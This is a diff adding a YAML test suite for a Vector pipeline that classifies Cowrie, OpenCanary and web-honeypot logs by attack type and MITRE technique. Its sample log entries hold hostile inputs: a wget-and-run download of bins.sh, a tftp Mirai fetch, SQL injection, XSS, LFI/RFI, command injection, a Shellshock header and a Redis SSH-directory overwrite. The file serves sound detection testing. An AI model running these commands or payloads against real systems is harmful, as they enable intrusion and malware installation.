@@ -1,0 +1,497 @@
+# =============================================================================
+# Tests unitarios de normalización + reglas de clasificación.
+#   Ejecutar:  tests/run_vector_tests.sh
+# Cada test inyecta una línea nativa en la transformación de normalización y
+# comprueba el evento resultante a la salida de "classify" (casos positivos y
+# negativos). Para añadir una regla nueva, añade aquí su caso.
+# =============================================================================
+tests:
+  # ------------------------------------------------------------------ COWRIE
+  - name: cowrie_connect_es_recon_scan
+    inputs:
+      - insert_at: norm_cowrie
+        type: log
+        log_fields:
+          message: |-
+            {"eventid":"cowrie.session.connect","src_ip":"45.12.34.56","src_port":51234,"dst_ip":"172.30.0.10","dst_port":2222,"session":"a1b2c3d4e5f6","protocol":"ssh","message":"New connection","sensor":"hp-cowrie","timestamp":"2026-11-23T10:15:30.123456Z"}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.honeypot, "cowrie")
+              assert_eq!(.service, "ssh")
+              assert_eq!(.event_type, "connection")
+              assert_eq!(.src_ip, "45.12.34.56")
+              assert_eq!(.src_port, 51234)
+              assert_eq!(.dst_port, 2222)
+              assert_eq!(.session_id, "a1b2c3d4e5f6")
+              assert_eq!(."@timestamp", "2026-11-23T10:15:30.123Z")
+              assert_eq!(.attack_type, "recon_scan")
+              assert_eq!(.mitre_technique, "T1595")
+              assert_eq!(.mitre_tactic, "Reconnaissance")
+              assert!(match!(.event_id, r'^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$'))
+
+  - name: cowrie_login_failed_es_brute_force
+    inputs:
+      - insert_at: norm_cowrie
+        type: log
+        log_fields:
+          message: |-
+            {"eventid":"cowrie.login.failed","username":"root","password":"123456","message":"login attempt [root/123456] failed","sensor":"hp-cowrie","timestamp":"2026-11-23T10:15:32.000001Z","src_ip":"45.12.34.56","session":"a1b2c3d4e5f6"}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.event_type, "auth_attempt")
+              assert_eq!(.auth.username, "root")
+              assert_eq!(.auth.password, "123456")
+              assert_eq!(.auth.success, false)
+              assert_eq!(.attack_type, "brute_force")
+              assert_eq!(.mitre_technique, "T1110")
+              assert_eq!(.mitre_tactic, "Credential Access")
+
+  - name: cowrie_login_success_marca_success_true
+    inputs:
+      - insert_at: norm_cowrie
+        type: log
+        log_fields:
+          message: |-
+            {"eventid":"cowrie.login.success","username":"admin","password":"admin","message":"login attempt [admin/admin] succeeded","sensor":"hp-cowrie","timestamp":"2026-11-23T10:15:35.500000Z","src_ip":"45.12.34.56","session":"a1b2c3d4e5f6"}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.auth.success, true)
+              assert_eq!(.attack_type, "brute_force")
+
+  - name: cowrie_comando_normal_es_post_exploitation
+    inputs:
+      - insert_at: norm_cowrie
+        type: log
+        log_fields:
+          message: |-
+            {"eventid":"cowrie.command.input","input":"cat /etc/passwd","message":"CMD: cat /etc/passwd","sensor":"hp-cowrie","timestamp":"2026-11-23T10:16:00.000000Z","src_ip":"45.12.34.56","session":"a1b2c3d4e5f6"}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.event_type, "command")
+              assert_eq!(.command, "cat /etc/passwd")
+              assert_eq!(.attack_type, "post_exploitation_command")
+              assert_eq!(.mitre_technique, "T1059.004")
+              assert_eq!(.mitre_tactic, "Execution")
+
+  - name: cowrie_curl_sin_url_NO_es_malware
+    inputs:
+      - insert_at: norm_cowrie
+        type: log
+        log_fields:
+          message: |-
+            {"eventid":"cowrie.command.input","input":"curl --version","message":"CMD: curl --version","sensor":"hp-cowrie","timestamp":"2026-11-23T10:16:01.000000Z","src_ip":"45.12.34.56","session":"a1b2c3d4e5f6"}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.attack_type, "post_exploitation_command")
+
+  - name: cowrie_wget_url_es_malware_download
+    inputs:
+      - insert_at: norm_cowrie
+        type: log
+        log_fields:
+          message: |-
+            {"eventid":"cowrie.command.input","input":"cd /tmp; wget http://185.10.20.30/bins.sh; chmod +x bins.sh; sh bins.sh","message":"CMD","sensor":"hp-cowrie","timestamp":"2026-11-23T10:16:05.000000Z","src_ip":"45.12.34.56","session":"a1b2c3d4e5f6"}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.attack_type, "malware_download")
+              assert_eq!(.mitre_technique, "T1105")
+              assert_eq!(.mitre_tactic, "Command and Control")
+
+  - name: cowrie_tftp_es_malware_download
+    inputs:
+      - insert_at: norm_cowrie
+        type: log
+        log_fields:
+          message: |-
+            {"eventid":"cowrie.command.input","input":"tftp -g -r mirai.arm 185.10.20.30","message":"CMD","sensor":"hp-cowrie","timestamp":"2026-11-23T10:16:06.000000Z","src_ip":"45.12.34.56","session":"a1b2c3d4e5f6"}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.attack_type, "malware_download")
+
+  - name: cowrie_file_download
+    inputs:
+      - insert_at: norm_cowrie
+        type: log
+        log_fields:
+          message: |-
+            {"eventid":"cowrie.session.file_download","url":"http://185.10.20.30/bins.sh","outfile":"var/lib/cowrie/downloads/ab12","shasum":"ab12cd34ef56ab12cd34ef56ab12cd34ef56ab12cd34ef56ab12cd34ef56ab12","message":"Downloaded URL","sensor":"hp-cowrie","timestamp":"2026-11-23T10:16:07.000000Z","src_ip":"45.12.34.56","session":"a1b2c3d4e5f6"}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.event_type, "file_download")
+              assert_eq!(.file.url, "http://185.10.20.30/bins.sh")
+              assert_eq!(.file.name, "bins.sh")
+              assert_eq!(.file.sha256, "ab12cd34ef56ab12cd34ef56ab12cd34ef56ab12cd34ef56ab12cd34ef56ab12")
+              assert_eq!(.attack_type, "malware_download")
+
+  - name: cowrie_session_closed_es_other_sin_mitre
+    inputs:
+      - insert_at: norm_cowrie
+        type: log
+        log_fields:
+          message: |-
+            {"eventid":"cowrie.session.closed","duration":12.4,"message":"Connection lost after 12 seconds","sensor":"hp-cowrie","timestamp":"2026-11-23T10:16:20.000000Z","src_ip":"45.12.34.56","session":"a1b2c3d4e5f6"}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.event_type, "session_close")
+              assert_eq!(.duration_s, 12.4)
+              assert_eq!(.attack_type, "other")
+              assert!(!exists(.mitre_technique))
+              assert!(!exists(.mitre_tactic))
+
+  - name: cowrie_evento_irrelevante_se_descarta
+    inputs:
+      - insert_at: norm_cowrie
+        type: log
+        log_fields:
+          message: |-
+            {"eventid":"cowrie.client.version","version":"SSH-2.0-libssh_0.9.6","message":"Remote SSH version","sensor":"hp-cowrie","timestamp":"2026-11-23T10:15:31.000000Z","src_ip":"45.12.34.56","session":"a1b2c3d4e5f6"}
+    no_outputs_from: [classify]
+
+  - name: cowrie_telnet_se_propaga_a_toda_la_sesion
+    inputs:
+      - insert_at: norm_cowrie
+        type: log
+        log_fields:
+          message: |-
+            {"eventid":"cowrie.session.connect","src_ip":"61.7.8.9","src_port":40000,"dst_ip":"172.30.0.10","dst_port":2223,"session":"ffee00112233","protocol":"telnet","message":"New connection","sensor":"hp-cowrie","timestamp":"2026-11-23T11:00:00.000000Z"}
+      - insert_at: norm_cowrie
+        type: log
+        log_fields:
+          message: |-
+            {"eventid":"cowrie.login.failed","username":"root","password":"xc3511","message":"login failed","sensor":"hp-cowrie","timestamp":"2026-11-23T11:00:02.000000Z","src_ip":"61.7.8.9","session":"ffee00112233"}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.service, "telnet")
+              assert_eq!(.honeypot, "cowrie")
+
+  # -------------------------------------------------------------- OPENCANARY
+  - name: opencanary_ftp_login
+    inputs:
+      - insert_at: norm_opencanary
+        type: log
+        log_fields:
+          message: |-
+            {"dst_host":"172.30.0.20","dst_port":21,"local_time":"2026-11-23 10:20:00.123456","local_time_adjusted":"2026-11-23 10:20:00.123456","logdata":{"PASSWORD":"admin123","USERNAME":"ftpuser"},"logtype":2000,"node_id":"hp-opencanary","src_host":"91.20.30.40","src_port":44321,"utc_time":"2026-11-23 10:20:00.123456"}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.honeypot, "opencanary")
+              assert_eq!(.service, "ftp")
+              assert_eq!(.event_type, "auth_attempt")
+              assert_eq!(.src_ip, "91.20.30.40")
+              assert_eq!(.dst_port, 21)
+              assert_eq!(.auth.username, "ftpuser")
+              assert_eq!(.auth.password, "admin123")
+              assert_eq!(.auth.success, false)
+              assert_eq!(."@timestamp", "2026-11-23T10:20:00.123Z")
+              assert_eq!(.attack_type, "brute_force")
+
+  - name: opencanary_mysql_login
+    inputs:
+      - insert_at: norm_opencanary
+        type: log
+        log_fields:
+          message: |-
+            {"dst_host":"172.30.0.20","dst_port":3306,"local_time":"2026-11-23 10:21:00.000000","logdata":{"PASSWORD":"b2f5ff47436671b6e533d8dc3614845d","USERNAME":"root"},"logtype":8001,"node_id":"hp-opencanary","src_host":"91.20.30.40","src_port":44400,"utc_time":"2026-11-23 10:21:00.000000"}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.service, "mysql")
+              assert_eq!(.attack_type, "brute_force")
+
+  - name: opencanary_redis_comando
+    inputs:
+      - insert_at: norm_opencanary
+        type: log
+        log_fields:
+          message: |-
+            {"dst_host":"172.30.0.20","dst_port":6379,"local_time":"2026-11-23 10:22:00.000000","logdata":{"CMD":"CONFIG","ARGS":"SET dir /root/.ssh"},"logtype":17001,"node_id":"hp-opencanary","src_host":"91.20.30.40","src_port":44500,"utc_time":"2026-11-23 10:22:00.000000"}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.service, "redis")
+              assert_eq!(.event_type, "command")
+              assert_eq!(.command, "CONFIG SET dir /root/.ssh")
+              assert_eq!(.attack_type, "post_exploitation_command")
+
+  - name: opencanary_arranque_se_descarta
+    inputs:
+      - insert_at: norm_opencanary
+        type: log
+        log_fields:
+          message: |-
+            {"dst_host":"","dst_port":-1,"local_time":"2026-11-23 10:00:00.000000","logdata":{"msg":{"logdata":"Added service from class"}},"logtype":1001,"node_id":"hp-opencanary","src_host":"","src_port":-1,"utc_time":"2026-11-23 10:00:00.000000"}
+    no_outputs_from: [classify]
+
+  # -------------------------------------------------------------------- WEB
+  - name: web_sqli_clasico
+    inputs:
+      - insert_at: norm_web
+        type: log
+        log_fields:
+          message: |-
+            {"@timestamp":"2026-11-23T10:30:00.100Z","event_id":"11111111-1111-4111-8111-111111111111","honeypot":"web","service":"http","event_type":"request","src_ip":"103.5.6.7","src_port":50000,"dst_port":8080,"session_id":"s1","http":{"method":"GET","path":"/search","query":"q=1' OR 1=1--","headers":{"host":"localhost"},"user_agent":"Mozilla/5.0","status":200}}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.attack_type, "sqli")
+              assert_eq!(.mitre_technique, "T1190")
+              assert_eq!(.mitre_tactic, "Initial Access")
+              assert_eq!(.event_id, "11111111-1111-4111-8111-111111111111")
+
+  - name: web_sqli_url_encoded
+    inputs:
+      - insert_at: norm_web
+        type: log
+        log_fields:
+          message: |-
+            {"@timestamp":"2026-11-23T10:30:01.100Z","event_id":"11111111-1111-4111-8111-111111111112","honeypot":"web","service":"http","event_type":"request","src_ip":"103.5.6.7","http":{"method":"GET","path":"/search","query":"q=1%27%20UNION%20SELECT%20username,password%20FROM%20users--","user_agent":"Mozilla/5.0"}}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.attack_type, "sqli")
+
+  - name: web_sqli_por_user_agent_sqlmap
+    inputs:
+      - insert_at: norm_web
+        type: log
+        log_fields:
+          message: |-
+            {"@timestamp":"2026-11-23T10:30:02.100Z","event_id":"11111111-1111-4111-8111-111111111113","honeypot":"web","service":"http","event_type":"request","src_ip":"103.5.6.7","http":{"method":"GET","path":"/item","query":"id=5","user_agent":"sqlmap/1.7.2#stable (https://sqlmap.org)"}}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.attack_type, "sqli")
+
+  - name: web_xss
+    inputs:
+      - insert_at: norm_web
+        type: log
+        log_fields:
+          message: |-
+            {"@timestamp":"2026-11-23T10:31:00.000Z","event_id":"11111111-1111-4111-8111-111111111114","honeypot":"web","service":"http","event_type":"request","src_ip":"103.5.6.8","http":{"method":"GET","path":"/search","query":"q=<script>alert(1)</script>","user_agent":"Mozilla/5.0"}}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.attack_type, "xss")
+              assert_eq!(.mitre_technique, "T1190")
+
+  - name: web_lfi
+    inputs:
+      - insert_at: norm_web
+        type: log
+        log_fields:
+          message: |-
+            {"@timestamp":"2026-11-23T10:32:00.000Z","event_id":"11111111-1111-4111-8111-111111111115","honeypot":"web","service":"http","event_type":"request","src_ip":"103.5.6.9","http":{"method":"GET","path":"/download","query":"file=../../../../etc/passwd","user_agent":"curl/7.68.0"}}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.attack_type, "lfi_rfi")
+
+  - name: web_rfi
+    inputs:
+      - insert_at: norm_web
+        type: log
+        log_fields:
+          message: |-
+            {"@timestamp":"2026-11-23T10:32:30.000Z","event_id":"11111111-1111-4111-8111-111111111116","honeypot":"web","service":"http","event_type":"request","src_ip":"103.5.6.9","http":{"method":"GET","path":"/index.php","query":"page=http://evil.example/shell.txt","user_agent":"Mozilla/5.0"}}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.attack_type, "lfi_rfi")
+
+  - name: web_command_injection
+    inputs:
+      - insert_at: norm_web
+        type: log
+        log_fields:
+          message: |-
+            {"@timestamp":"2026-11-23T10:33:00.000Z","event_id":"11111111-1111-4111-8111-111111111117","honeypot":"web","service":"http","event_type":"request","src_ip":"103.5.6.10","http":{"method":"GET","path":"/ping","query":"host=127.0.0.1;cat /etc/hosts","user_agent":"Mozilla/5.0"}}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.attack_type, "command_injection")
+              assert_eq!(.mitre_technique, "T1059")
+              assert_eq!(.mitre_tactic, "Execution")
+
+  - name: web_shellshock_en_user_agent
+    inputs:
+      - insert_at: norm_web
+        type: log
+        log_fields:
+          message: |-
+            {"@timestamp":"2026-11-23T10:33:30.000Z","event_id":"11111111-1111-4111-8111-111111111118","honeypot":"web","service":"http","event_type":"request","src_ip":"103.5.6.10","http":{"method":"GET","path":"/cgi-bin/status","user_agent":"() { :; }; /bin/bash -c 'id'"}}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.attack_type, "command_injection")
+
+  - name: web_ruta_de_escaner_es_recon
+    inputs:
+      - insert_at: norm_web
+        type: log
+        log_fields:
+          message: |-
+            {"@timestamp":"2026-11-23T10:34:00.000Z","event_id":"11111111-1111-4111-8111-111111111119","honeypot":"web","service":"http","event_type":"request","src_ip":"103.5.6.11","http":{"method":"GET","path":"/wp-login.php","user_agent":"Mozilla/5.0"}}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.attack_type, "recon_scan")
+              assert_eq!(.mitre_technique, "T1595")
+
+  - name: web_user_agent_nikto_es_recon
+    inputs:
+      - insert_at: norm_web
+        type: log
+        log_fields:
+          message: |-
+            {"@timestamp":"2026-11-23T10:34:30.000Z","event_id":"11111111-1111-4111-8111-11111111111a","honeypot":"web","service":"http","event_type":"request","src_ip":"103.5.6.11","http":{"method":"GET","path":"/","user_agent":"Mozilla/5.00 (Nikto/2.1.6)"}}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.attack_type, "recon_scan")
+
+  - name: web_peticion_legitima_es_other
+    inputs:
+      - insert_at: norm_web
+        type: log
+        log_fields:
+          message: |-
+            {"@timestamp":"2026-11-23T10:35:00.000Z","event_id":"11111111-1111-4111-8111-11111111111b","honeypot":"web","service":"http","event_type":"request","src_ip":"88.1.2.3","http":{"method":"GET","path":"/products","query":"id=5&q=laptop and mouse&sort=price","user_agent":"Mozilla/5.0 (X11; Linux x86_64) Firefox/120.0"}}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.attack_type, "other")
+              assert!(!exists(.mitre_technique))
+
+  - name: web_texto_con_onlooker_NO_es_xss
+    inputs:
+      - insert_at: norm_web
+        type: log
+        log_fields:
+          message: |-
+            {"@timestamp":"2026-11-23T10:35:30.000Z","event_id":"11111111-1111-4111-8111-11111111111c","honeypot":"web","service":"http","event_type":"request","src_ip":"88.1.2.3","http":{"method":"GET","path":"/blog","query":"q=onlooker select your favourite item","user_agent":"Mozilla/5.0"}}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.attack_type, "other")
+
+  - name: web_subida_de_fichero
+    inputs:
+      - insert_at: norm_web
+        type: log
+        log_fields:
+          message: |-
+            {"@timestamp":"2026-11-23T10:36:00.000Z","event_id":"11111111-1111-4111-8111-11111111111d","honeypot":"web","service":"http","event_type":"file_upload","src_ip":"103.5.6.12","http":{"method":"POST","path":"/upload","user_agent":"Mozilla/5.0","status":200},"file":{"name":"shell.php","sha256":"0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f","size":1234}}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.attack_type, "file_upload")
+              assert_eq!(.mitre_technique, "T1505.003")
+              assert_eq!(.mitre_tactic, "Persistence")
+              assert_eq!(.file.name, "shell.php")
+
+  - name: web_login_es_brute_force
+    inputs:
+      - insert_at: norm_web
+        type: log
+        log_fields:
+          message: |-
+            {"@timestamp":"2026-11-23T10:37:00.000Z","event_id":"11111111-1111-4111-8111-11111111111e","honeypot":"web","service":"http","event_type":"auth_attempt","src_ip":"103.5.6.13","http":{"method":"POST","path":"/login","body":"username=admin&password=admin","user_agent":"python-requests/2.31"},"auth":{"username":"admin","password":"admin","success":false}}
+    outputs:
+      - extract_from: classify
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.attack_type, "brute_force")
+              assert_eq!(.auth.success, false)
+
+  # ------------------------------------------------------- COLA DE ERRORES
+  - name: linea_corrupta_cowrie_va_a_cola_de_errores
+    inputs:
+      - insert_at: norm_cowrie
+        type: log
+        log_fields:
+          message: '{"eventid": "cowrie.login.failed", "src_ip": "45.12.'
+    outputs:
+      - extract_from: norm_cowrie.dropped
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.message, "{\"eventid\": \"cowrie.login.failed\", \"src_ip\": \"45.12.")
+
+  - name: src_ip_invalida_va_a_cola_de_errores
+    inputs:
+      - insert_at: norm_cowrie
+        type: log
+        log_fields:
+          message: |-
+            {"eventid":"cowrie.login.failed","username":"root","password":"x","message":"login failed","sensor":"hp-cowrie","timestamp":"2026-11-23T10:15:32.000001Z","src_ip":"999.999.1.1","session":"zzzz00001111"}
+    outputs:
+      - extract_from: classify.dropped
+        conditions:
+          - type: vrl
+            source: |
+              assert_eq!(.src_ip, "999.999.1.1")
